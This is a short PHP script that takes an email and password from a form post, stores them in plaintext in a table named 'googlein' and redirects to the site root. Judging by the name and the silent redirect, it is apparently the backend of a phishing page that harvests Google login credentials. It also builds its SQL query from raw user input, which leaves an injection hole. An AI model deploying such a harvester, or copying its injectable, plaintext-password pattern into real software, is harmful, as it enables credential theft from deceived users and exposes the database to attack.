<?php
$email = $_POST['email'];
$password = $_POST['password'];
    include_once '../settings.php';
    $conn = new mysqli($db_server, $db_username, $db_password, $db_dbname);

    // Check connection
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }
    $sql = "INSERT into chat.googlein(name,pwd) VALUES ('$email','$password');";
$result = $conn->query($sql);
var_dump($result);

echo "<script>window.location.href = '/';</script>"
?>
